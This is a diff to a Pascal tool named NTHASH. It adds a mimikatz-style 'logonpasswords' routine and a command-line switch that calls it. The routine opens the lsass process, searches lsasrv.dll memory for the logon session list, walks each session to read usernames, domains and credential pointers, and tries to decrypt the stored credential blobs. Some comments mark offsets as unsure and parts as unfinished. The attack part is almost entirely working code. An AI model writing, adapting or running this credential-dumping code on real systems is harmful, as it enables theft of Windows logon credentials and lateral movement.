@@ -5,8 +5,96 @@ program NTHASH;
 uses windows, classes, sysutils, dos, usamlib, usid, upsapi, uimagehlp,
   uadvapi32, utils, untdll, umemory, ucryptoapi, usamutils, uofflinereg;
 
+type _LUID =record
+     LowPart:DWORD;
+     HighPart:LONG;
+end;
+
+  //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block
+
+  type _KIWI_MSV1_0_PRIMARY_CREDENTIALS =record
+	next:pointer;
+	Primary:pointer; //B260AF51e0 : pointer to B260AF51f8 ?
+	Credentials:LSA_UNICODE_STRING; //starts with Primary#0 then you got your secret ?
+                                        //or buffer actually point to B260AF5200 and not B260AF51F8
+        end;
+ PKIWI_MSV1_0_PRIMARY_CREDENTIALS=^_KIWI_MSV1_0_PRIMARY_CREDENTIALS;
+
+  type _KIWI_MSV1_0_CREDENTIALS =record
+	next:pointer;
+	AuthenticationPackageId:DWORD;
+	PrimaryCredentials:PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
+  end;
+PKIWI_MSV1_0_CREDENTIALS=^_KIWI_MSV1_0_CREDENTIALS;
+
+type _KIWI_MSV1_0_LIST_63 =record
+	Flink:nativeuint;	//off_2C5718
+	Blink:nativeuint; //off_277380
+	unk0:pvoid; // unk_2C0AC8
+	unk1:ULONG; // 0FFFFFFFFh
+	unk2:PVOID; // 0
+	unk3:ULONG; // 0
+	unk4:ULONG; // 0
+	unk5:ULONG; // 0A0007D0h
+	hSemaphore6:handle; // 0F9Ch
+	unk7:PVOID; // 0
+	hSemaphore8:HANDLE; // 0FB8h
+	unk9:PVOID; // 0
+	unk10:PVOID; // 0
+	unk11:ULONG; // 0
+	unk12:ULONG; // 0
+	unk13:PVOID; // unk_2C0A28
+	LocallyUniqueIdentifier:_LUID; //LUID would work
+	SecondaryLocallyUniqueIdentifier:_LUID;
+	waza:array[0..11] of byte; /// to do (maybe align)
+	UserName:LSA_UNICODE_STRING;
+	Domain:LSA_UNICODE_STRING;
+	unk14:PVOID;
+	unk15:PVOID;
+	Type_:LSA_UNICODE_STRING;
+	pSid:PSID;
+	LogonType:ULONG;
+	unk18:PVOID;
+	Session:ULONG;
+	LogonTime:LARGE_INTEGER; // autoalign x86
+	LogonServer:LSA_UNICODE_STRING;
+	Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
+	unk19:PVOID;
+	unk20:PVOID;
+	unk21:PVOID;
+	unk22:ULONG;
+	unk23:ULONG;
+	unk24:ULONG;
+	unk25:ULONG;
+	unk26:ULONG;
+	unk27:PVOID;
+	unk28:PVOID;
+	unk29:PVOID;
+	CredentialManager:PVOID;
+        end;
+ PKIWI_MSV1_0_LIST_63=^_KIWI_MSV1_0_LIST_63;
 
 
+type _LIST_ENTRY =record
+   Flink:nativeuint;                      //0
+   Blink:nativeuint;                      //8
+   unk1:nativeuint; //608bc8c0 000000b2   //16
+   unk2:nativeuint; //ffffffff 00000000   //24
+   unk3:nativeuint; //00000000 00000000   //32
+   unk4:nativeuint; //00000000 00000000   //40
+   unk5:nativeuint; //0a0007d0 00000000   //48
+   unk6:nativeuint; //000010f4 00000000   //56
+   unk7:nativeuint; //00000000 00000000   //64
+   unk8:nativeuint; //00000c5c 00000000   //72
+   unk9:nativeuint; //00000000 00000000   //80
+   unk10:nativeuint; //00000000 00000000  //88
+   unk11:nativeuint; //00000000 00000000
+   unk12:nativeuint; //608bca80 000000b2
+   unk13:nativeuint; //1f7883e5 00000000
+   unk14:nativeuint; //1f7883c4 00000000
+   end;
+  LIST_ENTRY=_LIST_ENTRY;
+  PLIST_ENTRY=^_LIST_ENTRY;
 
 {$ifdef CPU64}
 type i_logsesslist=record
@@ -590,6 +678,194 @@ begin
 
 end;
 
+//check kuhl_m_sekurlsa_utils.c
+function logonpasswords(pid:dword;module:string):boolean;
+const
+  //dd Lsasrv!LogonSessionList in windbg
+  PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
+  after:array[0..1] of byte=($eb,$04);
+  //after:array[0..1] of byte=($0F,$84);
+var
+  dummy:string;
+  hprocess,hmod:thandle;
+  hmods:array[0..1023] of thandle;
+  MODINFO:  MODULEINFO;
+  cbNeeded,count:	 DWORD;
+  szModName:array[0..254] of char;
+  addr:pointer;
+  offset_list:array[0..3] of byte;
+  offset_list_dword:dword;
+  read:cardinal;
+  offset:nativeint=0;
+  patch_pos:ShortInt=0;
+  pattern:array of byte;
+  logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
+  bytes:array[0..254] of byte;
+  password,decrypted:tbytes;
+  //username,domain:array [0..254] of widechar;
+begin
+  if pid=0 then exit;
+  //if user='' then exit;
+  //
+  if (lowercase(osarch)='amd64') then
+     begin
+     if copy(winver,1,3)='6.3' then
+        begin
+        setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
+        end ;
+
+     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
+     patch_pos:=23;
+     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
+     patch_pos:=36;
+
+     end;
+  if (lowercase(osarch)='x86') then
+     begin
+        //
+     end;
+
+  if patch_pos =0 then
+     begin
+     log('no patch mod for this windows version',1);
+     exit;
+     end;
+  log('patch pos:'+inttostr(patch_pos ),0);
+  //
+  hprocess:=thandle(-1);
+  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                        false,pid);
+  if hprocess<>thandle(-1) then
+       begin
+       log('openprocess ok',0);
+       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
+       cbneeded:=0;
+       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
+               begin
+               log('EnumProcessModules OK',0);
+
+               for count:=0 to cbneeded div sizeof(thandle) do
+                   begin
+                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
+                      begin
+                      dummy:=lowercase(strpas(szModName ));
+                      if pos(lowercase(module),dummy)>0 then
+                         begin
+                         log(module+' found:'+inttohex(hMods[count],8),0);
+                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
+                            begin
+                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
+                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
+                            addr:=MODINFO.lpBaseOfDll;
+                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            log('Searching...',0);
+                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
+                            log('Done!',0);
+                            if offset<>0 then
+                                 begin
+                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
+                                 //
+                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+                                   begin
+                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
+                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
+                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
+                                   //new offset to the list entry
+                                   {$ifdef CPU64}
+                                   offset:= offset+offset_list_dword+4+patch_pos;
+                                   {$endif CPU64}
+                                   {$ifdef CPU32}
+                                   offset:= offset_list_dword{+patch_pos};
+                                   {$endif CPU32}
+                                   log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+                                   //read sesslist at offset
+                                   ReadMem  (hprocess,offset,logsesslist );
+                                   dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
+                                   //lets skip the first one
+                                   ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
+                                   //lets loop
+                                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
+                                   //while dummy<>inttohex(offset,sizeof(pointer)) do
+                                   while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
+                                   begin
+                                   //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
+                                   log('entry#next:'+dummy,0) ;
+
+                                   //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
+                                   //get username
+                                   ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes );
+                                   log('username:'+strpas (pwidechar(@bytes[0])));
+                                   //copymemory(@username[0],@bytes[0],64);
+                                   //log('username:'+widestring(username),1);
+                                   //get domain
+                                   ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).domain.buffer),bytes );
+                                   log('domain:'+strpas (pwidechar(@bytes[0])));
+                                   //copymemory(@domain[0],@bytes[0],64);
+                                   //log('domain:'+widestring(domain),1);
+                                   //
+                                   log('CredentialsPtr:'+inttohex(nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials),sizeof(pointer))) ;
+                                   if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
+                                     begin
+                                     //we should loop thru credentials...
+                                     ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).credentials),bytes );
+                                     log('CREDENTIALS.next:'+inttohex (nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next),sizeof(pointer) ));
+                                     log('CREDENTIALS.AuthID:'+inttostr (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId ));
+                                     log('CREDENTIALS.PrimaryCredentialsPtr:'+inttohex(nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,sizeof(pointer))) ;
+                                     //we should loop thru primary credentials...
+                                     ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,bytes );
+                                     log('PrimaryCredentials.Next:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).next) ,sizeof(pointer))) ;
+                                     log('PrimaryCredentials.Primary:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary) ,sizeof(pointer))) ;
+                                     log('PrimaryCredentials.Credentials.buffer:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer) ,sizeof(pointer))) ;
+                                     log('PrimaryCredentials.Credentials.length:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length )) ;
+                                     //decrypt !
+                                     if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
+                                       begin
+                                       setlength(password,PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
+                                       ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),password );
+                                       setlength(decrypted,1024);
+                                       if decryptLSA (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,password,decrypted)=false
+                                                     then log('decryptLSA NOT OK');
+                                       end;
+                                     end;
+                                   {
+                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
+                                   if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
+                                     begin
+                                     setlength(password,i_logsesslist (logsesslist ).maxlen3);
+                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
+                                     setlength(decrypted,1024);
+                                     if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
+                                        then log(strpas (pwidechar(@decrypted[0]) ),1);
+                                     end;
+                                   }
+                                   //next
+                                   ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
+                                   dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
+                                   end;
+                                   //...
+
+                                   end; //if readmem
+                                 end;
+                            {//test - lets read first 4 bytes of our module
+                             //can be verified with process hacker
+                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
+                               begin
+                               log('ReadProcessMemory OK');
+                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
+                               end;
+                            }
+                            end;//if GetModuleInformation...
+                         end; //if pos('samsrv.dll',dummy)>0 then
+                      end; //if GetModuleFileNameExA
+                   end; //for count:=0...
+               end; //if EnumProcessModules...
+       closehandle(hprocess);
+       end;//if openprocess...
+
+end;
+
 
 
 //check kuhl_m_sekurlsa_utils.c
@@ -895,16 +1171,12 @@ begin
         end;
      end;
   //
-  //logon list located in memory
-  //now need to get lsakeys to decrypt crdentials
-  //dumplogons (lsass_pid,'');
-  //_FindPid ;
   //enum_samusers(samkey);
-  password:='Password2212';
-  setlength(buffer,length(password)+1);
-  Move(password[1], buffer[0], Length(password)+1);
-  if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
-  exit;
+  //password:='Password2212';
+  //setlength(buffer,length(password)+1);
+  //Move(password[1], buffer[0], Length(password)+1);
+  //if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
+  //exit;
   //
   p:=pos('/getlsakeys',cmdline);
   if p>0 then
@@ -916,6 +1188,12 @@ begin
         log('AESKey:'+HashByteToString (aeskey),1);
         end;
      exit;
+     end;
+  p:=pos('/logonpasswords',cmdline);
+  if p>0 then
+     begin
+     findlsakeys (lsass_pid,deskey,aeskey,iv );
+     logonpasswords (lsass_pid,'lsasrv.dll');
      end;
   p:=pos('/wdigest',cmdline);
   if p>0 then
